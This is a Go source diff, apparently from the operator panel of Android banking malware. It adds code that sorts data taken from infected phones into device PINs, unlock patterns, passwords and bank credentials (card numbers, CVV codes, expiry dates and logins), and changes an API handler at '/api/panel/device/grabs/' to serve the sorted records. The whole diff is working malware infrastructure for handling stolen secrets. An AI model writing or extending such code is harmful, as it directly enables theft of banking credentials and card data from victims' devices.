@@ -111,6 +111,70 @@ func HandleDevicePushLogs(w http.ResponseWriter, r *http.Request) {
 	writeJSON(w, map[string]any{"logs": logs})
 }
 
+func transformGrab(id int, grabType, created string, raw map[string]any) map[string]any {
+	str := func(key string) string {
+		v, _ := raw[key].(string)
+		return v
+	}
+
+	category := grabType
+	var text, appName, appPkg, hint string
+
+	switch grabType {
+	case "pin_captured":
+		category = "pin"
+		text = str("pin")
+		appName = "Device PIN"
+		appPkg = str("package")
+		if appPkg == "" {
+			appPkg = "system"
+		}
+	case "pattern_captured":
+		category = "pattern"
+		text = str("pattern")
+		appName = "Device Pattern"
+		appPkg = "system"
+	case "password_captured":
+		category = "password"
+		text = str("password")
+		appName = "Device Password"
+		appPkg = "system"
+	case "bank_cred_captured":
+		ft := str("field_type")
+		switch ft {
+		case "card_number":
+			category = "card"
+		case "cvv":
+			category = "cvv"
+		case "expiry":
+			category = "expiry"
+		default:
+			category = "login"
+		}
+		text = str("text")
+		appName = str("app_name")
+		appPkg = str("package")
+		hint = str("hint")
+	}
+
+	if appName == "" {
+		appName = str("app_name")
+	}
+	if appName == "" && appPkg != "" {
+		appName = appPkg
+	}
+
+	return map[string]any{
+		"id":          id,
+		"category":    category,
+		"text":        text,
+		"app_name":    appName,
+		"app_package": appPkg,
+		"hint":        hint,
+		"created_at":  created,
+	}
+}
+
 func HandleDeviceGrabs(w http.ResponseWriter, r *http.Request) {
 	parts := strings.Split(strings.TrimPrefix(r.URL.Path, "/api/panel/device/grabs/"), "/")
 	var deviceID string
@@ -134,13 +198,12 @@ func HandleDeviceGrabs(w http.ResponseWriter, r *http.Request) {
 		var id int
 		var gtype, data, created string
 		rows.Scan(&id, &gtype, &data, &created)
-		var parsed any
-		if json.Unmarshal([]byte(data), &parsed) != nil {
-			parsed = data
+		var raw map[string]any
+		json.Unmarshal([]byte(data), &raw)
+		if raw == nil {
+			raw = map[string]any{}
 		}
-		grabs = append(grabs, map[string]any{
-			"id": id, "type": gtype, "data": parsed, "created_at": created,
-		})
+		grabs = append(grabs, transformGrab(id, gtype, created, raw))
 	}
 	if grabs == nil {
 		grabs = []map[string]any{}
